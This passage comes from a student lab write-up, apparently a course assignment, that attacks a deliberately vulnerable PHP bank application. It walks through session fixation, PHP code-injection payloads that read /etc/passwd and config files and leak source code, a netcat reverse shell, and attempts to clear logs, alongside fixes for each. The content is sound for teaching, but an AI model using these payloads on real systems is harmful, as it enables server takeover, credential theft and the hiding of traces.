+$sql=&quot;insert into &quot;.$htbconf[&#39;db/transfers&#39;].&quot; (&quot;.$htbconf[&#39;db/transfers.time&#39;].&quot;, &quot;.$htbconf[&#39;db/transfers.srcbank&#39;].&quot;, &quot;.$htbconf[&#39;db/transfers.srcacc&#39;].&quot;, &quot;.$htbconf[&#39;db/transfers.dstbank&#39;].&quot;, &quot;.$htbconf[&#39;db/transfers.dstacc&#39;].&quot;, &quot;.$htbconf[&#39;db/transfers.remark&#39;].&quot;, &quot;.$htbconf[&#39;db/transfers.amount&#39;].&quot;) values(now(), &quot;.$htbconf[&#39;bank/code&#39;].&quot;, &quot;.($http[&#39;srcacc&#39;] ^ $xorValue).&quot;, &quot;.$http[&#39;dstbank&#39;].&quot;, &quot;.$http[&#39;dstacc&#39;].&quot;, &#39;&quot;.$http[&#39;remark&#39;].&quot;&#39;, &quot;.$http[&#39;amount&#39;].&quot;)&quot;;  
+
+$result = mysql_query($sql);
+
+```</code></pre>
+<ul>
+<li><p>Fixed code:</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="va">$sql</span><span class="op">=</span><span class="st">&quot;insert into &quot;</span><span class="op">.</span><span class="va">$htbconf</span>[<span class="st">&#39;db/transfers&#39;</span>]<span class="op">.</span><span class="st">&quot; (&quot;</span><span class="op">.</span><span class="va">$htbconf</span>[<span class="st">&#39;db/transfers.time&#39;</span>]<span class="op">.</span><span class="st">&quot;, &quot;</span><span class="op">.</span><span class="va">$htbconf</span>[<span class="st">&#39;db/transfers.srcbank&#39;</span>]<span class="op">.</span><span class="st">&quot;, &quot;</span><span class="op">.</span><span class="va">$htbconf</span>[<span class="st">&#39;db/transfers.srcacc&#39;</span>]<span class="op">.</span><span class="st">&quot;, &quot;</span><span class="op">.</span><span class="va">$htbconf</span>[<span class="st">&#39;db/transfers.dstbank&#39;</span>]<span class="op">.</span><span class="st">&quot;, &quot;</span><span class="op">.</span><span class="va">$htbconf</span>[<span class="st">&#39;db/transfers.dstacc&#39;</span>]<span class="op">.</span><span class="st">&quot;, &quot;</span><span class="op">.</span><span class="va">$htbconf</span>[<span class="st">&#39;db/transfers.remark&#39;</span>]<span class="op">.</span><span class="st">&quot;, &quot;</span><span class="op">.</span><span class="va">$htbconf</span>[<span class="st">&#39;db/transfers.amount&#39;</span>]<span class="op">.</span><span class="st">&quot;) values(now(), &quot;</span><span class="op">.</span><span class="va">$htbconf</span>[<span class="st">&#39;bank/code&#39;</span>]<span class="op">.</span><span class="st">&quot;, &quot;</span><span class="op">.</span>(<span class="va">$http</span>[<span class="st">&#39;srcacc&#39;</span>] <span class="op">^</span> <span class="va">$xorValue</span>)<span class="op">.</span><span class="st">&quot;, &quot;</span><span class="op">.</span><span class="va">$http</span>[<span class="st">&#39;dstbank&#39;</span>]<span class="op">.</span><span class="st">&quot;, &quot;</span><span class="op">.</span><span class="va">$http</span>[<span class="st">&#39;dstacc&#39;</span>]<span class="op">.</span><span class="st">&quot;, &#39;&quot;</span><span class="op">.</span><span class="fu">htmlspecialchars</span>(<span class="va">$http</span>[<span class="st">&#39;remark&#39;</span>])<span class="op">.</span><span class="st">&quot;&#39;, &quot;</span><span class="op">.</span><span class="va">$http</span>[<span class="st">&#39;amount&#39;</span>]<span class="op">.</span><span class="st">&quot;)&quot;</span><span class="ot">;</span>  </span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="va">$result</span> <span class="op">=</span> <span class="er">mysql_query</span>(<span class="va">$sql</span>)<span class="ot">;</span></span></code></pre></div></li>
+<li><p><strong>Result:</strong></p>
+<figure>
+<img src="images/task2/4_XSS.JPG" alt="XSS" /><figcaption aria-hidden="true">XSS</figcaption>
+</figure></li>
+</ul>
+<ol start="2" type="1">
+<li>set <code>Http Only</code> flag to true in both index.php and login.php(where session is being set) to avoid cookies being accessed by client side scripts.</li>
+</ol>
+<div class="sourceCode" id="cb13"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="fu">session_set_cookie_params</span>(<span class="va">$htbconf</span>[<span class="st">&#39;bank/cookievalidity&#39;</span>]<span class="ot">,</span><span class="kw">null</span><span class="ot">,</span><span class="kw">null</span><span class="ot">,</span><span class="kw">null</span><span class="ot">,</span><span class="kw">true</span>)<span class="ot">;</span></span></code></pre></div>
+<p><strong>Result</strong></p>
+<figure>
+<img src="images/task2/HttpOnly_true.JPG" alt="Cookie_Hijaking_Fix" /><figcaption aria-hidden="true">Cookie_Hijaking_Fix</figcaption>
+</figure>
+<ul>
+<li><code>document.cookie</code> cant access cookie value.</li>
+</ul>
+<figure>
+<img src="images/task2/4.5.JPG" alt="Cookie_Hijaking_Fix" /><figcaption aria-hidden="true">Cookie_Hijaking_Fix</figcaption>
+</figure>
+<ul>
+<li>Go to <code>etc/apache2/apache2.conf</code> file and override <code>AllowOverride none</code> to <code>AllowOverride All</code>.</li>
+</ul>
+<figure>
+<img src="images/task2/SameOrigin_Apacheconf.JPG" alt="Cookie_Hijaking_Fix" /><figcaption aria-hidden="true">Cookie_Hijaking_Fix</figcaption>
+</figure>
+<ul>
+<li>Create a .htaccess(if unavailable) file in your website directory (/var/www/html) with following lines.</li>
+</ul>
+<figure>
+<img src="images/task2/SameOrigin_htaccess.JPG" alt="Cookie_Hijaking_Fix" /><figcaption aria-hidden="true">Cookie_Hijaking_Fix</figcaption>
+</figure>
+<h3 id="exercise-5-session-fixation">Exercise 5: Session Fixation</h3>
+<p><strong>1. Explain the difference to Session Hijacking.</strong><br />
+<strong>Solution :</strong> In Session Fixation, the attacker forces the user to use the session of his choice, wherein Session Hijacking, the logged-in user session is hijacked.</p>
+<p><strong>2. Sketch an attack that allows you to take over the session of a bank user</strong></p>
+<p><strong>Solution :</strong> - Found two approches in hijacking a session using session fixation. 1. This approch leverages the phishing attack. A victim is provided with a link and assumption is that he clicks the link. 2. Manual way, setting the broswer cookie to desired value with key being <code>USECURITYID</code> (assuming that attacker has physical access to victim’s browser).</p>
+<strong>Approach 1</strong> (Victim: <code>Alex</code>) - create a html file in your server folder with the following script, ```html
+<html>
+<script>
+        function getURL(){
+        document.cookie="USECURITYID=abcde";
+
+        window.open("http://localhost/htdocs/index.php?", "_blank");
+        }
+        </script>
+<head>
+<pre><code>      &lt;/head&gt;
+      &lt;body&gt;
+        &lt;h1&gt; Congo bro you are not gonna get hacked!! :D &lt;/h1&gt;
+       &lt;button onclick=&quot;getURL()&quot;&gt; Login &lt;/button&gt;
+      &lt;/body&gt;
+    &lt;/html&gt; 
+```</code></pre>
+<ul>
+<li><p>User is provided with the link <code>http://localhost:81/bank.html</code> which will redired to bank web application.</p>
+<figure>
+<img src="images/task2/5.1.JPG" alt="Attacker_Website" /><figcaption aria-hidden="true">Attacker_Website</figcaption>
+</figure></li>
+<li><p>When user get redirect the cookie value will be set to <code>abcde</code>.</p>
+<p><img src="images/task2/5.1.1.JPG" alt="Session_Fixation" />.</p></li>
+<li><p>Use the cookie value obtained and edit in the browser application and reload the page.</p>
+<figure>
+<img src="images/task2/sesseion_fixation_0.PNG" alt="sesseion_fixation_0" /><figcaption aria-hidden="true">sesseion_fixation_0</figcaption>
+</figure></li>
+<li><p>Attacker will now login into victim account.</p></li>
+<li><p><strong>Result</strong></p>
+<figure>
+<img src="images/task2/hijack_after_fixation_as_attacker.PNG" alt="hijack_after_fixation_as_attacker" /><figcaption aria-hidden="true">hijack_after_fixation_as_attacker</figcaption>
+</figure></li>
+</ul>
+<p><strong>Approach 2: Manual Approach</strong> (Victim: <code>Bob</code>) - <strong>step 1</strong>: Open <code>EditThiCookie</code> extension and click on import. - <strong>step 2:</strong> Use the following payload to set the cookie value,</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a>[</span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>{</span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;domain&quot;</span><span class="op">:</span> <span class="st">&quot;192.168.37.128&quot;</span><span class="op">,</span> <span class="co">//domain name or IP</span></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;expirationDate&quot;</span><span class="op">:</span> <span class="fl">1621190036.198929</span><span class="op">,</span></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;hostOnly&quot;</span><span class="op">:</span> <span class="kw">true</span><span class="op">,</span></span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;httpOnly&quot;</span><span class="op">:</span> <span class="kw">false</span><span class="op">,</span></span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;name&quot;</span><span class="op">:</span> <span class="st">&quot;USECURITYID&quot;</span><span class="op">,</span></span>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;path&quot;</span><span class="op">:</span> <span class="st">&quot;/&quot;</span><span class="op">,</span></span>
+<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;sameSite&quot;</span><span class="op">:</span> <span class="st">&quot;unspecified&quot;</span><span class="op">,</span></span>
+<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;secure&quot;</span><span class="op">:</span> <span class="kw">false</span><span class="op">,</span></span>
+<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;session&quot;</span><span class="op">:</span> <span class="kw">false</span><span class="op">,</span></span>
+<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;storeId&quot;</span><span class="op">:</span> <span class="st">&quot;0&quot;</span><span class="op">,</span></span>
+<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;value&quot;</span><span class="op">:</span> <span class="st">&quot;abcdefghi&quot;</span><span class="op">,</span>  <span class="co">//fixed value for name &#39;USECURITYID&#39;</span></span>
+<span id="cb15-14"><a href="#cb15-14" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;id&quot;</span><span class="op">:</span> <span class="dv">1</span></span>
+<span id="cb15-15"><a href="#cb15-15" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb15-16"><a href="#cb15-16" aria-hidden="true" tabindex="-1"></a>]</span></code></pre></div>
+<figure>
+<img src="images/task2/cookie_fixing.PNG" alt="cookie_fixing" /><figcaption aria-hidden="true">cookie_fixing</figcaption>
+</figure>
+<ul>
+<li>Allow the user to log in. <strong><em>Before Log in</em></strong></li>
+</ul>
+<figure>
+<img src="images/task2/fixation_before_login.PNG" alt="fixation_before_login" /><figcaption aria-hidden="true">fixation_before_login</figcaption>
+</figure>
+<p><strong><em>After Log in</em></strong> Same cookie value exists.</p>
+<figure>
+<img src="images/task2/fixation_after_login.png" alt="fixation_after_login" /><figcaption aria-hidden="true">fixation_after_login</figcaption>
+</figure>
+<ul>
+<li><strong>step 3</strong>: In another browser use the same cookie values to import it to <code>EditThisCookie</code> extension.</li>
+<li><strong>step 4</strong> Reload the page.</li>
+</ul>
+<p><strong>Result</strong> : Session successfully hijacked using the fixed cookie value.</p>
+<figure>
+<img src="images/task2/hijack_after_fixation.PNG" alt="hijack_after_fixation" /><figcaption aria-hidden="true">hijack_after_fixation</figcaption>
+</figure>
+<blockquote>
+<p>Another approach - setting the cookie value using HTTP header response by intercepting the traffic between web server and client’s browser.</p>
+</blockquote>
+<p><strong>3. How can you generally verify that an application is vulnerable to this type of attack?</strong> <strong>solution:</strong> - Set the cookie value to random string(usually similar length or format as actual cookie value) before logging in to the application. - Now login to the application. - Observe the cookie value set after login by the application in developer tools =&gt; storage. - If the cookie value is same as set before login and no new cookie name, values or parameters are added and the account is still logged in, then we can confirm that application is vulnerable to session fixation attack.</p>
+<p><strong>4. Does https influence your attack?</strong> <strong>Solution :</strong> <code>https</code> has No influence on carrying out the session fixation attack, as the cookie values can be set in various ways, encrypting the traffic or running the application over secure protocol has no effect.</p>
+<p><strong>5. Accordingly, which countermeasure is necessary to prevent your attacks? Patch your system and test it against Session Fixation again.</strong></p>
+<p><strong>Solution</strong> Everytime a session has been started regenerate the session id.</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a>    <span class="fu">session_start</span>()<span class="ot">;</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>    <span class="fu">session_regenerate_id</span>(<span class="kw">TRUE</span>)<span class="ot">;</span> </span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>    <span class="va">$_SESSION</span><span class="op">=</span><span class="dt">array</span>()<span class="ot">;</span> <span class="co">// initializing a empty array values the session variable.</span></span></code></pre></div>
+<figure>
+<img src="images/task2/Session_fixation_before.JPG" alt="Session_fixation_before" /><figcaption aria-hidden="true">Session_fixation_before</figcaption>
+</figure>
+<figure>
+<img src="images/task2/Session_fixation_after.JPG" alt="Session_fixation_after" /><figcaption aria-hidden="true">Session_fixation_after</figcaption>
+</figure>
+<h3 id="exercise-6-remote-code-injection">Exercise 6: Remote Code Injection</h3>
+<p><strong>1. Find a section that allows you to inject and execute arbitrary code (PHP). Document your steps and explain why does it allow the execution?</strong> <strong>solution :</strong> 1. Found user input on <code>htbdetails</code> &gt; <code>Account details</code> page, where arbitary code injection is possible. After analysing the source code:</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="va">$replaceWith</span> <span class="op">=</span>  <span class="st">&quot;preg_replace(&#39;#\b&quot;</span><span class="op">.</span> <span class="fu">str_replace</span>(<span class="st">&#39;</span><span class="sc">\\</span><span class="st">&#39;</span><span class="ot">,</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>                <span class="st">&#39;</span><span class="sc">\\\\</span><span class="st">&#39;</span><span class="ot">,</span> <span class="va">$http</span>[<span class="st">&#39;query&#39;</span>]) <span class="op">.</span><span class="st">&quot;\b#i&#39;, &#39;&lt;span</span></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="st">                class=</span><span class="sc">\&quot;</span><span class="st">queryHighlight</span><span class="sc">\&quot;</span><span class="st">&gt;</span><span class="sc">\\\\</span><span class="st">0&lt;/span&gt;&#39;,&#39;</span><span class="sc">\\</span><span class="st">0&#39;)&quot;</span><span class="ot">;</span></span></code></pre></div>
+<p>preg_replace function is in strings and input is part of the string, terminated using <code>'</code> and injected php code and opened <code>'</code> for the continueing string.</p>
+<p>payload:</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39; . phpinfo() .&#39;</span></span></code></pre></div>
+<blockquote>
+<p><code>.</code> is used to concatenate to the string.</p>
+</blockquote>
+<p>that breaks the following query,</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="va">$replaceWith</span> <span class="op">=</span>  <span class="st">&quot;preg_replace(&#39;#\b&quot;</span><span class="op">.</span> <span class="fu">str_replace</span>(<span class="st">&#39;</span><span class="sc">\\</span><span class="st">&#39;</span><span class="ot">,</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a>                <span class="st">&#39;</span><span class="sc">\\\\</span><span class="st">&#39;</span><span class="ot">,</span> <span class="va">$http</span>[<span class="st">&#39;query&#39;</span>]) <span class="op">.</span><span class="st">&quot;\b#i&#39;, &#39;&lt;span</span></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a><span class="st">                class=</span><span class="sc">\&quot;</span><span class="st">queryHighlight</span><span class="sc">\&quot;</span><span class="st">&gt;</span><span class="sc">\\\\</span><span class="st">0&lt;/span&gt;&#39;,&#39;</span><span class="sc">\\</span><span class="st">0&#39;)&quot;</span><span class="ot">;</span></span></code></pre></div>
+<p>into,</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="va">$replaceWith</span> <span class="op">=</span> <span class="st">&quot;preg_replace(&#39;#\b&#39;. phpinfo() .&#39;\b#i&#39;, &#39;</span><span class="sc">\\</span><span class="st">0&#39;,&#39;</span><span class="sc">\0</span><span class="st">&#39;)&quot;</span><span class="ot">;</span></span></code></pre></div>
+<div class="sourceCode" id="cb21"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="va">$replaceWith</span> <span class="op">=</span><span class="st">&#39;&#39;</span><span class="op">.</span><span class="fu">phpinfo</span>()<span class="op">.</span><span class="st">&#39;&#39;</span><span class="ot">;</span>  </span></code></pre></div>
+<ul>
+<li><strong>Result</strong> <img src="images/task2/phpinfo.PNG" alt="Code execution - phpinfo" /></li>
+</ul>
+<p><strong>2. Disclose the master password for the database your bank application has access to. Indicate username, password and DB name as well as the IP address of the machine this database is running on.</strong> <strong>solution</strong></p>
+<ul>
+<li>Find the current location of the application and files in it.</li>
+</ul>
+<div class="sourceCode" id="cb22"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a> <span class="st">&#39;. system(&quot;pwd&quot;); .&#39;</span> </span></code></pre></div>
+<div class="sourceCode" id="cb23"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a> <span class="st">&#39;. system(&quot;ls&quot;); .&#39;</span> </span></code></pre></div>
+<p><strong>Result</strong></p>
+<figure>
+<img src="images/task2/code_execution_output.PNG" alt="code_execution_output" /><figcaption aria-hidden="true">code_execution_output</figcaption>
+</figure>
+<ul>
+<li><p>Found <code>config.php</code> file in <code>/etc</code> folder, now use the path to display out to the browser.</p>
+<div class="sourceCode" id="cb24"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="st">&#39;. system(&quot;cat ../etc/config.php&quot;); .&#39;</span> </span></code></pre></div>
+<figure>
+<img src="images/task2/6_2.JPG" alt="database_Details" /><figcaption aria-hidden="true">database_Details</figcaption>
+</figure></li>
+</ul>
+<p><strong>Database Details found:</strong></p>
+<table>
+<thead>
+<tr class="header">
+<th>Identifier</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Database Name</td>
+<td>vbank</td>
+</tr>
+<tr class="even">
+<td>user</td>
+<td>root</td>
+</tr>
+<tr class="odd">
+<td>password</td>
+<td>kakashi</td>
+</tr>
+<tr class="even">
+<td>ip</td>
+<td>127.0.0.1</td>
+</tr>
+</tbody>
+</table>
+<p><strong>3. Explain how you can display the php settings of your webserver! Which information is relevant for the attacker?</strong> <strong>solution</strong></p>
+<ul>
+<li><p>Relevant info:</p>
+<ul>
+<li>Exposing PHP version can lead to know attacks on that particular version.</li>
+</ul>
+<figure>
+<img src="images/task2/PHPV.JPG" alt="etc_passwd_displaying" /><figcaption aria-hidden="true">etc_passwd_displaying</figcaption>
+</figure>
+<ul>
+<li>Access to remote files can lead to attacks like SSRF.</li>
+</ul>
+<figure>
+<img src="images/task2/PHPV1.JPG" alt="etc_passwd_displaying" /><figcaption aria-hidden="true">etc_passwd_displaying</figcaption>
+</figure>
+<ul>
+<li>Open directory on can lead to remote file inclusion vulnerabilities.</li>
+</ul>
+<figure>
+<img src="images/task2/PHPV2.JPG" alt="etc_passwd_displaying" /><figcaption aria-hidden="true">etc_passwd_displaying</figcaption>
+</figure>
+<ul>
+<li>Session details are useful to plot attack on user sessions like Session Hijaking or Fixation.</li>
+</ul>
+<figure>
+<img src="images/task2/PHPV3.JPG" alt="etc_passwd_displaying" /><figcaption aria-hidden="true">etc_passwd_displaying</figcaption>
+</figure></li>
+</ul>
+<p><strong>4. Assume you are running a server with virtual hosts. Can you disclose the password for another bank database and can you access it? Explain which potential risk does this vulnerability imply for virtual hosts?</strong> <strong>Solution</strong> Yes, as the code injection can lead to server takeover, it is possible to view database and passwords of all the bank acounts running on root host. Since the settings(<code>example.conf</code>) can be modified(Assuming the taken over account has write permissions).</p>
+<blockquote>
+<p>Usually database is same for all sub-domains in the application, unless the database is different for each virtual host, there are chances that vulnerable vhost has no to minimum impact on accessing other databases.</p>
+</blockquote>
+<p>If one virtual host is exploitable(code injection) that lead to other subdomain take over because of remote code injection vulnerability in one, which is a potential risk in vhosts. - Even though attacker may not have access to other subdomains intially, vulnerable subdomain (which attacker has access to) leads to other sub-domain take over.</p>
+<p><strong>5. Display /etc/passwd of the web server, the bank application is running on. Try different methods to achieve this goal. Explain why some methods cannot be successful.</strong> <strong>solution</strong></p>
+<ul>
+<li><p>payload used: <code>php         '. system("cat /etc/passwd") .'</code></p></li>
+<li><p>Result:</p>
+<figure>
+<img src="images/task2/etc_passwd.PNG" alt="etc_passwd_displaying" /><figcaption aria-hidden="true">etc_passwd_displaying</figcaption>
+</figure></li>
+<li><p>Other methods used/tried:(not successful)</p></li>
+</ul>
+<div class="sourceCode" id="cb25"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39; . echo include_once(&#39;</span><span class="op">/</span>etc<span class="op">/</span>passwd<span class="st">&#39;) . &#39;</span></span></code></pre></div>
+<div class="sourceCode" id="cb26"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39; . show_source(&quot;../../../../../../../etc/passwd&quot;, true) . &#39;</span></span></code></pre></div>
+<div class="sourceCode" id="cb27"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39; .  echo file_get_contents(&quot;../../../../../../../etc/passwd&quot;); . &#39;</span></span></code></pre></div>
+<p>The above methods are un-successfull as they are executing on server side but not as a response that can be viewed in browser.</p>
+<p><strong>6. Show how to “leak” the complete source files of your web application. Briefly describe, how you accomplished this.</strong> <strong>solution :</strong> - Since, command execution on <code>htbdetails</code> &gt; <code>Account details</code> page is possible, we used system commands to display the source files.</p>
+<ul>
+<li>Leaking index page
+<ul>
+<li><p>payload used <code>php       '. system("cat index.php") .'</code></p></li>
+<li><p>Application URL <code>javascript       http://192.168.37.128/htdocs/index.php?account=173105291&amp;page=       htbdetails&amp;query=%27.+system%28%22cat+index.php%22%29+.%27&amp;       submit=Submit+Query</code></p></li>
+<li><p><strong>Result</strong></p>
+<p><img src="images/task2/leak_source_1.PNG" alt="leak_source_1" /> <br></br></p></li>
+</ul></li>
+<li>Leaking login.php page
+<ul>
+<li>payload used</li>
+</ul>
+<div class="sourceCode" id="cb28"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="st">&#39;. system(&quot;cat login.php&quot;) .&#39;</span></span></code></pre></div>
+<ul>
+<li>Application URL <code>javascript       http://192.168.37.128/htdocs/index.php?account=173105291page=htbdetails       &amp;query=%27.+system%28%22cat+login.php%22%29+.%27&amp;submit=Submit+Query</code></li>
+<li><strong>Result</strong> <img src="images/task2/leak_source_2.PNG" alt="leak_source_2" /></li>
+</ul></li>
+</ul>
+<p><strong>7. Suppose you are an anonymous attacker: a) Upload a web shell on the victim server and show that you can take control of the server. b) Deface the main bank page. c) Clear possible traces that could lead to you.</strong> <strong>solution :</strong></p>
+<p><strong>a</strong>). Used <code>netcat</code> for creating a reverse connection from victim machine - payload used:</p>
+<div class="sourceCode" id="cb29"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;. system(&quot;nc -e /bin/sh 192.168.37.128 1234&quot;) .&#39;</span></span></code></pre></div>
+<ul>
+<li>On attcker machine (listen on corresponding port - 1234),</li>
+</ul>
+<div class="sourceCode" id="cb30"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a>    <span class="ex">$</span> sudo nc <span class="at">-lvnp</span>  1234  </span></code></pre></div>
+<ul>
+<li><strong>Result</strong> (received connection from victim) <img src="images/task2/reverse_shell.PNG" alt="reverse_shell" /></li>
+</ul>
+<p><strong>b</strong>). look for file permissions of index page (navigate to /var/www/html/htdocs),</p>
+<div class="sourceCode" id="cb31"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a>    <span class="ex">$</span> ls <span class="at">-la</span></span>
+<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a>    <span class="fu">ls</span> <span class="at">-la</span></span>
+<span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a>    <span class="ex">total</span> 40</span>
+<span id="cb31-4"><a href="#cb31-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">drwSr-sr-x</span> 3 root  root 4096 May 10 07:23 .</span>
+<span id="cb31-5"><a href="#cb31-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">drwxr-xr-x</span> 6 root  root 4096 May 12 10:15 ..</span>
+<span id="cb31-6"><a href="#cb31-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">-rw-rw-rw-</span> 1 mysql root  141 May 10 07:23 file</span>
+<span id="cb31-7"><a href="#cb31-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">-rw-r--r--</span> 1 root  root 6791 Apr  6  2014 htb.css</span>
+<span id="cb31-8"><a href="#cb31-8" aria-hidden="true" tabindex="-1"></a>    <span class="ex">-rw-r--r--</span> 1 root  root  591 Apr  6  2014 htb.js</span>
+<span id="cb31-9"><a href="#cb31-9" aria-hidden="true" tabindex="-1"></a>    <span class="ex">drwxr-xr-x</span> 3 root  root 4096 Mar 20  2014 images</span>
+<span id="cb31-10"><a href="#cb31-10" aria-hidden="true" tabindex="-1"></a>    <span class="ex">-rw-r--r--</span> 1 root  root 7080 May 12 11:06 index.php</span>
+<span id="cb31-11"><a href="#cb31-11" aria-hidden="true" tabindex="-1"></a>    <span class="ex">-rw-r--r--</span> 1 root  root 1997 May 10 05:34 login.php</span></code></pre></div>
+<blockquote>
+<p><code>index.php</code> is not writeable- hence defacing the obrtained account is not possible.</p>
+</blockquote>
+<p><strong>c</strong>). Escaping tty shell for better readability in terminal. - payload used:</p>
+<pre><code>```bash
+python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;
+```</code></pre>
+<ul>
+<li><p>locating bash_history.</p>
+<div class="sourceCode" id="cb33"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> locate bash_history</span>
+<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a><span class="fu">locate</span> bash_history</span>
+<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a><span class="ex">/home/kali/.bash_history</span></span>
+<span id="cb33-4"><a href="#cb33-4" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> cd /home/kali/</span></code></pre></div></li>
+<li><p>look for permissions</p>
+<div class="sourceCode" id="cb34"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ls <span class="at">-la</span> <span class="kw">|</span> <span class="fu">grep</span> bash</span>
+<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb34-3"><a href="#cb34-3" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span>  1 kali kali      1 Mar  3 16:41 .bash_history</span>
+<span id="cb34-4"><a href="#cb34-4" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span>  1 kali kali    220 Feb 23 05:36 .bash_logout</span>
+<span id="cb34-5"><a href="#cb34-5" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span>  1 kali kali   4705 Feb 23 05:36 .bashrc</span>
+<span id="cb34-6"><a href="#cb34-6" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span>  1 kali kali   3526 Feb 23 05:36 .bashrc.original</span></code></pre></div>
+<blockquote>
+<p>Since .bash_history is not writable, deleting is not possible.</p>
+</blockquote></li>
+<li><p>locating other log files</p>
+<div class="sourceCode" id="cb35"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> locate log <span class="kw">|</span> <span class="fu">grep</span> apache</span>
